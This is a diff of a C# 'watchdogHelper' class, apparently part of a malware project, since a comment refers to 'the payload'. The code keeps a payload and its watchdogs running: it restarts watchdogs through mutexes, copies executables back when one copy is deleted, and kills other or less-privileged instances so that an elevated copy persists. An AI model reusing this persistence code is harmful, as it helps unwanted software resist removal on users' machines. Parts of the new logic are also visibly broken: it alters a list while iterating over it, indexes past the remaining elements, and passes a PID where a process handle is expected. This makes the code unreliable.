@@ -1,4 +1,5 @@
-﻿using System.Diagnostics;
+﻿using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 
@@ -33,13 +34,17 @@ public class watchdogHelper
         }
         }
 
-        private static bool IsProcessRunning(string processName)
+        private static bool IsProcessRunning(string processName)//does processes by name when mutex cant be used (for the payload)
         {
-            // Get a list of processes by name
-            processName = processName.Replace(".exe", "");
-
-            Process[] processes = Process.GetProcessesByName(processName); //does processes by name when mutex cant be used (for the payload)
-            return processes.Length > 0;
+            try
+            {
+                // Get a list of processes by name
+                processName = processName.Replace(".exe", "");
+            }catch (Exception ex){
+                Log($"Error getting list of running processes: {ex.Message}");
+            }
+                Process[] processes = Process.GetProcessesByName(processName); 
+                return processes.Length > 0;
         }
 
         public static void Log(string message)
@@ -50,109 +55,9 @@ public class watchdogHelper
             }
         }
 
-        public static void verifyFilePathsSourceAndDest(string destinationPath, string filename) //checks for if file exists then copies it if not
-        {
-            try
-            {
-            string currentDirectory = Directory.GetCurrentDirectory();
-            string sourcePathFile = Path.Combine(currentDirectory, filename);
-            string destPathFile = Path.Combine(destinationPath, filename);
+       
 
-
-            EnsureDirectoryExists(destinationPath);
-
-
-            if (File.Exists(destPathFile) && File.Exists(sourcePathFile))
-            {
-                return;
-            }
-            else
-            {
-
-                if (File.Exists(sourcePathFile))
-                {
-                    // Copy the .exe to the destination
-                    try
-                    {
-                        File.Copy(sourcePathFile, destPathFile, overwrite: false);
-                        Log($"'{filename}' found and copied to {destPathFile}");
-                    }
-                    catch (Exception ex)
-                    {
-                        Log($"Error copying file: {ex.Message}");
-                    }
-                }
-                else if (File.Exists(destPathFile))
-                {
-                    try
-                    {
-                        File.Copy(destPathFile, sourcePathFile, overwrite: false);
-                        Log($"'{filename}' found and copied to {sourcePathFile}");
-                    }
-                    catch (Exception ex)
-                    {
-                        Log($"Error copying file: {ex.Message}");
-                    }
-                }
-                else
-                {
-                    Log($"'{filename}' not found in the current directory.");
-                }
-            }
-        }
-        catch (Exception ex) {
-            Log($"Error verifying and copying filepaths: {ex.Message}");
-        }
-        }
-
-        public static void EnsureHighestPriv(bool isNewInstance)
-        {
-            bool isAdmin = watchdogHelper.IsElevated();
-
-            if (!isNewInstance && isAdmin)
-            {
-
-                watchdogHelper.Log("Another instance of the watchdog is already running.");
-
-                int? PID = watchdogHelper.GetProcessIdByName(Process.GetCurrentProcess().ProcessName);
-
-                if (PID.HasValue)
-                {
-                    string permissionLevel = watchdogHelper.GetProcessPermissionLevel((int)PID);
-                    // rest of your code here
-
-                    if (permissionLevel != "Administrator")
-                    {
-                        watchdogHelper.Log("Killing lower privledged process.");
-                        watchdogHelper.KillProcessById((int)PID);
-                    }
-                    else
-                    {
-                        Environment.Exit(0);
-                    }
-                }
-                else
-                {
-                    // handle the case when PID is null
-                    watchdogHelper.Log("Failed to get process ID.");
-                    Environment.Exit(0);
-                }
-            }
-            else if (!isNewInstance)
-            {
-                Environment.Exit(0);
-            }
-
-            // Call the main watchdog logic
-            if (isNewInstance)
-            {
-                return;
-            }
-            else
-            {
-                Environment.Exit(0);
-            }
-        }
+       
 
         private static void runBinary(string filePath, string arguments = "")
         {
@@ -185,6 +90,7 @@ public class watchdogHelper
             Process process = Process.GetProcessById(pid);
             process.Kill();
             process.WaitForExit();// waits for exit to avoid issues with claimed mutex
+            process.Dispose();
             return true;
         }
         catch (ArgumentException)
@@ -198,7 +104,60 @@ public class watchdogHelper
         return false;
     }
 
-    public static bool IsElevated() // detects whether the program is running as system or adiministrator
+    public static void EnsureHighestPriv(bool isNewInstance)
+    {
+        bool isElevated = watchdogHelper.IsElevated();
+
+        if (!isNewInstance && isElevated)// if this process is admin or system and not a new instance
+        {
+
+            watchdogHelper.Log("Another instance of the watchdog is already running.");
+
+            List<Process> processes = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).ToList<Process>(); // get a list of Processes with the same name as the current process
+
+            int? currentID = Process.GetCurrentProcess().Id;
+
+            foreach (Process process in processes){
+                if(process.Id == currentID)
+                {
+                    processes.Remove(process);
+                } // remove current process from the list
+            }
+
+            if (processes.Count > 1) // kill every other process except one
+            {
+                for (int i = 1; i < processes.Count; i++)
+                {
+                    KillProcessById(processes[i].Id);
+                }
+            }
+
+            int otherProcessID = processes[1].Id;
+            if (IsPIDElevated(otherProcessID))
+            {
+                Environment.Exit(0);
+            }
+            else
+            {
+                KillProcessById(otherProcessID);
+            }
+        }
+        else if (!isNewInstance)
+        {
+            Environment.Exit(0);
+        }
+
+        // Call the main watchdog logic
+        if (isNewInstance)
+        {
+            return;
+        }
+        else
+        {
+            Environment.Exit(0);
+        }
+    }
+    public static bool IsElevated() // detects whether the program is running as system or administrator
     {
         WindowsIdentity identity = WindowsIdentity.GetCurrent();
         WindowsPrincipal principal = new WindowsPrincipal(identity);
@@ -206,33 +165,12 @@ public class watchdogHelper
         return isElevated;
     }
 
-    public static string GetProcessPermissionLevel(int pid)
-    {
-        try
-        {
-            using (Process process = Process.GetProcessById(pid))
-            {
-                IntPtr processHandle = process.Handle;
-
-                if (IsProcessElevated(processHandle))
-                    return "Administrator";
-                else
-                    return "User";
-            }
-        }
-        catch (Exception ex)
-        {
-            watchdogHelper.Log($"Error getting process permission level: {ex.Message}");
-            return "Unknown";
-        }
-    }
-
-    private static bool IsProcessElevated(IntPtr processHandle)
+    private static bool IsPIDElevated(int processHandle)
     {
         IntPtr tokenHandle = IntPtr.Zero;
         try
         {
-            if (OpenProcessToken(processHandle, TOKEN_QUERY, out tokenHandle))
+            if (OpenProcessToken((IntPtr)processHandle, TOKEN_QUERY, out tokenHandle))
             {
                 var elevation = new TOKEN_ELEVATION();
                 int elevationSize = Marshal.SizeOf(typeof(TOKEN_ELEVATION));
@@ -284,31 +222,6 @@ public class watchdogHelper
     {
         public int TokenIsElevated;
     }
-
-public static int? GetProcessIdByName(string processName)
-        {
-        try
-        {
-            Process[] processes = Process.GetProcessesByName(processName);
-
-            foreach (var process in processes)
-            {
-                // Skip the current process
-                if (process.Id == Process.GetCurrentProcess().Id) continue;
-
-                // Return the ID of the first instance found that's not the current process
-                return process.Id;
-            }
-        }
-        catch (Exception ex)
-        {
-            watchdogHelper.Log("Error getting PID from process name: " + ex.Message);
-        }
-
-        return null; // Return null if no process is found or an error occurs
-    }
-
-
     public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
         {
             if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
@@ -336,10 +249,65 @@ public static int? GetProcessIdByName(string processName)
             }
             catch (Exception ex)
             {
-                // Log or handle the exception here
                 Log($"An error occurred while creating the directory: {ex.Message}");
             }
         }
+    public static void verifyFilePathsSourceAndDest(string destinationPath, string filename) //checks for if file exists then copies it if not
+    {
+        try
+        {
+            string currentDirectory = Directory.GetCurrentDirectory();
+            string sourcePathFile = Path.Combine(currentDirectory, filename);
+            string destPathFile = Path.Combine(destinationPath, filename);
 
 
+            EnsureDirectoryExists(destinationPath);
+
+
+            if (File.Exists(destPathFile) && File.Exists(sourcePathFile))
+            {
+                return;
+            }
+            else
+            {
+
+                if (File.Exists(sourcePathFile))
+                {
+                    // Copy the .exe to the destination
+                    try
+                    {
+                        File.Copy(sourcePathFile, destPathFile, overwrite: false);
+                        Log($"'{filename}' found and copied to {destPathFile}");
+                    }
+                    catch (Exception ex)
+                    {
+                        Log($"Error copying file: {ex.Message}");
+                    }
+                }
+                else if (File.Exists(destPathFile))
+                {
+                    try
+                    {
+                        File.Copy(destPathFile, sourcePathFile, overwrite: false);
+                        Log($"'{filename}' found and copied to {sourcePathFile}");
+                    }
+                    catch (Exception ex)
+                    {
+                        Log($"Error copying file: {ex.Message}");
+                    }
+                }
+                else
+                {
+                    Log($"'{filename}' not found in the current directory.");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Log($"Error verifying and copying filepaths: {ex.Message}");
+        }
     }
+
+}
+        
+    
